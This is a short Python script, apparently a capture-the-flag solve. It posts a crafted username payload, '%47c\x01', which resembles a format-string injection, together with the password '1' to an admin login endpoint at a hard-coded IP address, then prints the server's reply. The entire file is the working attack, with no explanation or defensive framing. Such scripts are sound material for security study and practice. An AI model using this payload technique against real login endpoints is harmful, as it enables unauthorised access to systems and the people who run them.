#!/usr/bin/python3

import requests as re

data = {
	'username': '%47c\x01',
	'password': '1',
}
res = re.post('http://103.162.14.116:5002/admin', data=data)
print(res.content)